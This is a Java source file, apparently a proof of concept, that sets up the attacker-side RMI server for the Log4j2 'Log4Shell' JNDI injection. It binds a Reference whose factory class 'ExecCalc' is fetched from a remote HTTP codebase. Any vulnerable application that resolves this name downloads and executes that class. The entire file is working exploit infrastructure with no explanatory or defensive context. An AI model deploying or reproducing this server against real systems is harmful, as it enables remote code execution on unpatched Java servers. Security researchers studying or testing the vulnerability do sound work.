import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.Reference;


/**
 * @author: ryan_scy@126.com
 * @date: 2023-02-12
 * @time: 20:38
 * @desc:
 */
public class Log4j2Server {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(12345);
        Reference reference = new Reference("ExecCalc", "ExecCalc",
                "http://127.0.0.1:8080/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("remote", wrapper);
    }
}
